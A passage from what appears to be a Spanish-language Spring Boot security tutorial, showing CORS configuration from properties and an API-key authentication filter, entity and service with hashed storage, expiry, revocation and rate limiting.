                    .allowedHeaders("Authorization", "Content-Type")
                    .allowCredentials(true)
                    .maxAge(3600); // Cache preflight por 1 hora
            }
        };
    }
}

// ✅ MEJOR - Configuración dinámica desde properties
@Configuration
public class DynamicCorsConfig {

    @Value("${cors.allowed-origins}")
    private String[] allowedOrigins;

    @Bean
    public CorsFilter corsFilter() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowCredentials(true);
        config.setAllowedOrigins(Arrays.asList(allowedOrigins));
        config.setAllowedHeaders(Arrays.asList(
            "Authorization",
            "Content-Type",
            "X-Requested-With"
        ));
        config.setAllowedMethods(Arrays.asList(
            "GET", "POST", "PUT", "DELETE", "OPTIONS"
        ));
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", config);

        return new CorsFilter(source);
    }
}
```

```properties
# application.properties
cors.allowed-origins=https://myapp.com,https://www.myapp.com
```

### 7.3 API Keys

```java
// ✅ API Key authentication

@Component
public class ApiKeyFilter extends OncePerRequestFilter {

    @Autowired
    private ApiKeyRepository apiKeyRepository;

    private static final String API_KEY_HEADER = "X-API-Key";

    @Override
    protected void doFilterInternal(
        HttpServletRequest request,
        HttpServletResponse response,
        FilterChain filterChain
    ) throws ServletException, IOException {

        String path = request.getRequestURI();

        // Endpoints públicos no requieren API key
        if (path.startsWith("/api/public/")) {
            filterChain.doFilter(request, response);
            return;
        }

        String apiKey = request.getHeader(API_KEY_HEADER);

        if (apiKey == null || apiKey.isEmpty()) {
            sendError(response, "Missing API Key");
            return;
        }

        // Verificar API key
        Optional<ApiKeyEntity> keyEntity = apiKeyRepository
            .findByKeyHash(hashApiKey(apiKey));

        if (keyEntity.isEmpty()) {
            sendError(response, "Invalid API Key");
            return;
        }

        ApiKeyEntity entity = keyEntity.get();

        // Verificar no expirada
        if (entity.getExpiresAt().isBefore(LocalDateTime.now())) {
            sendError(response, "API Key expired");
            return;
        }

        // Verificar no revocada
        if (entity.isRevoked()) {
            sendError(response, "API Key revoked");
            return;
        }

        // Verificar rate limit por API key
        if (!checkRateLimit(entity)) {
            response.setStatus(429);
            response.getWriter().write("Rate limit exceeded");
            return;
        }

        // Log uso
        logApiKeyUsage(entity, request);

        // Continuar
        filterChain.doFilter(request, response);
    }

    private String hashApiKey(String apiKey) {
        return DigestUtils.sha256Hex(apiKey);
    }

    private void sendError(HttpServletResponse response, String message)
        throws IOException {
        response.setStatus(401);
        response.setContentType("application/json");
        response.getWriter().write(
            "{\"error\": \"" + message + "\"}"
        );
    }
}

// Entity para almacenar API keys
@Entity
public class ApiKeyEntity {

    @Id
    private Long id;

    private String name; // Descripción legible

    // ❌ NO guardar API key en plain text
    // ✅ Guardar hash de la key
    @Column(unique = true)
    private String keyHash;

    private String userId; // Dueño de la key

    @Column(nullable = false)
    private LocalDateTime createdAt;

    private LocalDateTime expiresAt;

    private boolean revoked = false;

    // Rate limits específicos para esta key
    private int requestsPerMinute = 60;
    private int requestsPerDay = 10000;

    // Último uso
    private LocalDateTime lastUsedAt;
    private long totalRequests = 0;
}

// Service para generar API keys
@Service
public class ApiKeyService {

    @Autowired
    private ApiKeyRepository apiKeyRepository;

    public ApiKeyResponse createApiKey(String userId, String name) {
        // Generar key aleatoria segura
        String apiKey = generateSecureApiKey();

        // Guardar hash
        ApiKeyEntity entity = new ApiKeyEntity();
        entity.setName(name);
        entity.setKeyHash(DigestUtils.sha256Hex(apiKey));
        entity.setUserId(userId);
        entity.setCreatedAt(LocalDateTime.now());
        entity.setExpiresAt(LocalDateTime.now().plusYears(1));

        apiKeyRepository.save(entity);

        // ⚠️ IMPORTANTE: Solo mostrar la key UNA VEZ al crear
        // Después solo se puede revocar y crear nueva
        return new ApiKeyResponse(apiKey, entity);
    }

    private String generateSecureApiKey() {
        SecureRandom random = new SecureRandom();
        byte[] bytes = new byte[32];
        random.nextBytes(bytes);

        // Formato: "sk_live_" + base64
        return "sk_live_" + Base64.getUrlEncoder()
            .withoutPadding()
            .encodeToString(bytes);
    }

    public void revokeApiKey(Long keyId, String userId) {
        ApiKeyEntity key = apiKeyRepository.findById(keyId)
            .orElseThrow(() -> new NotFoundException("API key not found"));

        // Verificar ownership
        if (!key.getUserId().equals(userId)) {
            throw new ForbiddenException("Not your API key");
        }

        key.setRevoked(true);
        apiKeyRepository.save(key);
    }
}
```

---

Continúa en el siguiente mensaje por límite de caracteres...